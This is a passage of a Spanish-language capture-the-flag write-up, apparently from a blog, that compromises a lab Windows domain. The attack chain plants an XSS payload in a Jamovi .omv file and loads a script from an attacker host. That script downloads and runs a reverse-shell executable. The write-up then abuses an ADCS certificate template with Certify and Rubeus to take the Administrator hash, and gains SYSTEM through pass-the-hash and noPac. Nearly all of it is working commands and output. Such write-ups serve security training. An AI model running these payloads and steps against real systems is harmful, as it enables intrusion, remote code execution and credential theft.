+<p class="plain-text">La vulnerabilidad esta en el archivo <code class="language-plaintext highlighter-rouge">metadata.json</code>, el campo <code class="language-plaintext highlighter-rouge">name</code> de dataSet.fields, simplemente cambiamos el nombre por un payload de <code class="language-plaintext highlighter-rouge">XSS</code> que cargue un <code class="language-plaintext highlighter-rouge">.js</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">metadata.json | </span><span class="ve">jq</span><span class="p"> | </span><span class="ve">head  </span><span class="p">
+{
+  </span><span class="az">"dataSet"</span><span class="p">: {
+    </span><span class="az">"rowCount"</span><span class="p">: 150,
+    </span><span class="az">"columnCount"</span><span class="p">: 5,
+    </span><span class="az">"removedRows"</span><span class="p">: [],
+    </span><span class="az">"addedRows"</span><span class="p">: [],
+    </span><span class="az">"fields"</span><span class="p">: [
+      {
+        </span><span class="az">"name"</span><span class="p">: </span><span class="ve">"Sepal.Length"</span><span class="p">,
+        </span><span class="az">"id"</span><span class="p">: 1,</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">metadata.json | </span><span class="ve">jq</span><span class="p"> | </span><span class="ve">head</span><span class="p">
+{
+  </span><span class="az">"dataSet"</span><span class="p">: {
+    </span><span class="az">"rowCount"</span><span class="p">: 150,
+    </span><span class="az">"columnCount"</span><span class="p">: 5,
+    </span><span class="az">"removedRows"</span><span class="p">: [],
+    </span><span class="az">"addedRows"</span><span class="p">: [],
+    </span><span class="az">"fields"</span><span class="p">: [
+      {
+        </span><span class="az">"name"</span><span class="p">: </span><span class="ve">"&ltscript src=\"http://10.10.14.10/pwned.js\">&lt/script>"</span><span class="p">,  
+        </span><span class="az">"id"</span><span class="p">: 1,</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez modificado el archivo <code class="language-plaintext highlighter-rouge">json</code> podemos volver a comprimirlo usando <code class="language-plaintext highlighter-rouge">zip</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ zip </span><span class="p">-r Whatif.omv .
+  adding: META-INF/ (stored 0%)
+  adding: META-INF/MANIFEST.MF (deflated 30%)  
+  adding: metadata.json (deflated 78%)
+  adding: data.bin (deflated 84%)
+  adding: xdata.json (deflated 33%)
+  adding: 01 empty/ (stored 0%)
+  adding: 01 empty/analysis (deflated 8%)
+  adding: index.html (deflated 67%)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que podemos escribir en el directorio Analytics subimos nuestro archivo <code class="language-plaintext highlighter-rouge">omv</code> modificado y esperamos a que el usuario lo ejecute y cargue nuestro <code class="language-plaintext highlighter-rouge">.js</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">windcorp.htb/localadmin:Secret123@earth.windcorp.htb  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# use Shared
+# cd Documents\Analytics
+# put Whatif.omv
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Creamos el js que interpretara con el <code class="language-plaintext highlighter-rouge">XSS</code>, sera uno que ejecute un comando el cual descargara nuestro <code class="language-plaintext highlighter-rouge">exe</code> malicioso y lo ejecutara para enviarmos una powershell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">pwned.js
+</span><span class="no">require</span><span class="p">(</span><span class="s">'child_process'</span><span class="p">).exec(</span><span class="s">'curl 10.10.14.10/shell.exe -o C:</span><span class="mi">\\</span><span class="s">ProgramData</span><span class="mi">\\</span><span class="s">shell.exe && C:</span><span class="mi">\\</span><span class="s">ProgramData</span><span class="mi">\\</span><span class="s">shell.exe'</span><span class="p">)  
+
+</span><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de unos segundos recibimos 2 peticiones, la primera del <code class="language-plaintext highlighter-rouge">XSS</code> que hace una petición a <code class="language-plaintext highlighter-rouge">pwned.js</code> y cuando lo interpreta descarga el archivo <code class="language-plaintext highlighter-rouge">shell.exe</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
+10.10.11.102 - - "GET /pwned.js HTTP/1.1" 200 -
+10.10.11.102 - - "GET /shell.exe HTTP/1.1" 200 -</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez descarga y ejecuta el <code class="language-plaintext highlighter-rouge">shell.exe</code> recibimos una shell como <code class="language-plaintext highlighter-rouge">diegocruz</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.102 
+Windows PowerShell running as user diegocruz on EARTH
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\System32> </span><span class="am">whoami</span><span class="p">
+windcorp\diegocruz
+PS C:\Windows\System32> </span><span class="am">type </span><span class="p">C:\Users\diegocruz\Desktop\user.txt  
+f1c**************************dce
+PS C:\Windows\System32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Entre los recursos smb podiamos ver <code class="language-plaintext highlighter-rouge">CertEnroll</code> que pertenece a los servicios de ADCS, usando <a href="https://github.com/GhostPack/Certify">Certify</a> podemos buscar templates vulnerables para el usuario actual</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\Certify.exe </span><span class="p">find /vulnerable /currentuser
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using current user's unrolled group SIDs for vulnerability checks.
+[*] Using the search base 'CN=Configuration,DC=windcorp,DC=htb' 
+
+[*] Listing info about the Enterprise CA 'windcorp-CA'
+
+    Enterprise CA Name            : windcorp-CA 
+    DNS Hostname                  : earth.windcorp.htb
+    FullName                      : earth.windcorp.htb\windcorp-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=windcorp-CA, DC=windcorp, DC=htb 
+    Cert Thumbprint               : 280458EB20AE6B8A8FFE9B428A5078094F91B3E8
+    Cert Serial                   : 3645930A75C5C8BA4AAC0A5C883DEE60
+    Cert Start Date               : 5/24/2021 7:48:07 PM
+    Cert End Date                 : 5/24/2036 7:58:07 PM
+    Cert Chain                    : CN=windcorp-CA,DC=windcorp,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512  
+      Allow  ManageCA, ManageCertificates               WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519  
+    Enrollment Agent Restrictions : None
+
+[+] No Vulnerable Certificates Templates found!
+
+    CA Name                               : earth.windcorp.htb\windcorp-CA
+    Template Name                         : Web
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : Server Authentication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+        All Extended Rights         : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+      Object Control Permissions
+        Owner                       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
+        Full Control Principals     : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+        WriteOwner Principals       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
+                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+        WriteDacl Principals        : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
+                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+        WriteProperty Principals    : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
+                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
+                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
+                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Encontramos el template <code class="language-plaintext highlighter-rouge">Web</code> vulnerable para el ca <code class="language-plaintext highlighter-rouge">windcorp-CA</code>, podemos explotarlo ya que como Owner tiene al grupo <code class="language-plaintext highlighter-rouge">webdevelopers</code> al que pertenecemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">Get-ADPrincipalGroupMembership </span><span class="p">DiegoCruz | </span><span class="am">Select </span><span class="p">Name  
+
+Name         
+----         
+Domain Users 
+webdevelopers
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podriamos usar el modulo <a href="https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1">ADCS.ps1</a> sin embargo hay un problema con el <code class="language-plaintext highlighter-rouge">UPN</code> y es que los UPN de todos los usuarios tienen errores como diegocruz que tiene <code class="language-plaintext highlighter-rouge">.thm</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$TargetUPN </span><span class="o">= </span><span class="p">$user.userprincipalname</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">Get-DomainUser </span><span class="p">DiegoCruz | </span><span class="am">Select </span><span class="p">UserPrincipalName  
+
+userprincipalname       
+-----------------       
+Diego.Cruz@windcorp.thm 
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El de <code class="language-plaintext highlighter-rouge">Administrator</code> tampoco esta funcional asi que en lugar del <code class="language-plaintext highlighter-rouge">UPN</code> usaremos el <code class="language-plaintext highlighter-rouge">samaccountname</code> que siempre contiene solo el nombre de usuario sin errores</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$TargetUPN </span><span class="o">=</span><span class="p"> $user.samaccountname</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">Get-DomainUser </span><span class="p">DiegoCruz | </span><span class="am">Select </span><span class="p">SamAccountName  
+
+samaccountname      
+--------------      
+DiegoCruz
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez modificado descargamos e importamos el modulo además del <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">curl </span><span class="p">10.10.14.10/PowerView.ps1 </span><span class="c1">-o </span><span class="p">PowerView.ps1  
+PS C:\ProgramData> </span><span class="am">curl </span><span class="p">10.10.14.10/ADCS.ps1 </span><span class="c1">-o </span><span class="p">ADCS.ps1
+PS C:\ProgramData> </span><span class="am">Import-Module </span><span class="p">.\PowerView.ps1
+PS C:\ProgramData> </span><span class="am">Import-Module </span><span class="p">.\ADCS.ps1
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con la funcion de <code class="language-plaintext highlighter-rouge">ADCS.ps1</code> generamos la solicitud de certificado a la CA pasandole el <code class="language-plaintext highlighter-rouge">template</code> vulnerable y el usuario objetivo que sera <code class="language-plaintext highlighter-rouge">Administrator</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">Get-SmartCardCertificate </span><span class="c1">-Identity </span><span class="p">Administrator </span><span class="c1">-TemplateName </span><span class="p">Web</span><span class="c1"> -NoSmartCard  </span><span class="p">
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de hacer eso en los <code class="language-plaintext highlighter-rouge">certificados</code> del usuario actual aparecera uno nuevo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">dir </span><span class="p">Cert:\CurrentUser\My
+
+   PSParentPath: Microsoft.PowerShell.Security\Certificate::CurrentUser\My  
+
+Thumbprint                                Subject
+----------                                -------
+18592151042BBBA86D2BDEEAD0D925319617AA34
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente con <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> podemos pedir un <code class="language-plaintext highlighter-rouge">TGT</code> como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> aprovechando el certificado que obtuvimos y con <code class="language-plaintext highlighter-rouge">/getcredentials</code> vemos su hash</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\Rubeus.exe </span><span class="p">asktgt /user:Administrator /certificate:18592151042BBBA86D2BDEEAD0D925319617AA34 /getcredentials  
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.3
+
+[*] Action: Ask TGT 
+
+[*] Using PKINIT with etype rc4_hmac and subject:   
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'windcorp.htb\Administrator'
+[*] Using domain controller: fe80::a164:1a09:4f17:c177%11:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  krbtgt/windcorp.htb
+  ServiceRealm             :  WINDCORP.HTB
+  UserName                 :  Administrator (NT_PRINCIPAL)
+  UserRealm                :  WINDCORP.HTB
+  StartTime                :  8/23/2023 2:55:45 AM
+  EndTime                  :  8/23/2023 12:55:45 PM
+  RenewTill                :  8/30/2023 2:55:45 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  0gyXDVOKVxUJ1ZOmmCtyRg==
+  ASREP (key)              :  CB252D96A6E974533C0FF2170187FE68
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : 3CCC18280610C6CA3156F995B5899E09
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> el hash NT de Administrator y devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb windcorp.htb -u Administrator -H 3CCC18280610C6CA3156F995B5899E09
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">windcorp.htb     445    EARTH            </span><span class="ve">[+] </span><span class="p">windcorp.htb\Administrator:3CCC18280610C6CA3156F995B5899E09 </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Haciendo uso de <code class="language-plaintext highlighter-rouge">psexec</code> podemos obtener una cmd como <code class="language-plaintext highlighter-rouge">nt authority\system</code> donde podemos leer finalmente la <code class="language-plaintext highlighter-rouge">flag</code> del usuario Administrator en su escritorio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">windcorp.htb/Administrator@earth.windcorp.htb -hashes :3CCC18280610C6CA3156F995B5899E09  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on earth.windcorp.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file caZMBxbg.exe
+[*] Opening SVCManager on earth.windcorp.htb.....
+[*] Creating service niHR on earth.windcorp.htb.....
+[*] Starting service niHR.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2114]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+ce5**************************1cc
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si quisieramos conectarnos al servicio de <code class="language-plaintext highlighter-rouge">winrm</code> necesitariamos pasar por el <code class="language-plaintext highlighter-rouge">proxy</code> que creamos antes por chisel, asi obtenemos una <code class="language-plaintext highlighter-rouge">powershell</code> mas estable</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i 172.21.48.1 -u Administrator -H 3CCC18280610C6CA3156F995B5899E09  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+windcorp\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+ce5**************************1cc
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra-administrator">
+<br><h3 class="post-title">Extra - Administrator</h3><br>
+
+<p class="plain-text">Como alternativa podemos usar <a href="https://github.com/Ridter/noPac">noPac</a>, al explotarlo indicando el parametro <code class="language-plaintext highlighter-rouge">-shell</code> nos otorgara una cmd como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> directamente en el <code class="language-plaintext highlighter-rouge">DC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains </span><span class="p">-q python3 noPac.py windcorp.htb/localadmin:Secret123 -shell -dc-ip 172.21.48.1
+
+███    ██  ██████  ██████   █████   ██████
+████   ██ ██    ██ ██   ██ ██   ██ ██
+██ ██  ██ ██    ██ ██████  ███████ ██
+██  ██ ██ ██    ██ ██      ██   ██ ██
+██   ████  ██████  ██      ██   ██  ██████
+
+[*] Current ms-DS-MachineAccountQuota = 10
+[-] Resolved Failed: All nameservers failed to answer the query earth.windcorp.htb. IN A: Server Do53:172.21.48.1@53 answered SERVFAIL  
+[*] Selected Target earth.windcorp.htb
+[*] Total Domain Admins 1
+[*] will try to impersonate Administrator
+[*] Adding Computer Account "WIN-FLYHEVN8UQL$"
+[*] MachineAccount "WIN-FLYHEVN8UQL$" password = L5v9KjbLROOc
+[*] Successfully added machine account WIN-FLYHEVN8UQL$ with password L5v9KjbLROOc.
+[*] WIN-FLYHEVN8UQL$ object = CN=WIN-FLYHEVN8UQL,CN=Computers,DC=windcorp,DC=htb
+[*] WIN-FLYHEVN8UQL$ sAMAccountName == earth
+[*] Saving a DC's ticket in earth.ccache
+[*] Reseting the machine account to WIN-FLYHEVN8UQL$
+[*] Restored WIN-FLYHEVN8UQL$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*] Saving a user's ticket in Administrator.ccache
+[*] Rename ccache to Administrator_earth.windcorp.htb.ccache
+[*] Attempting to del a computer with the name: WIN-FLYHEVN8UQL$
+[-] Delete computer WIN-FLYHEVN8UQL$ Failed! Maybe the current user does not have permission.
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+
+C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+ce5**************************1cc
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
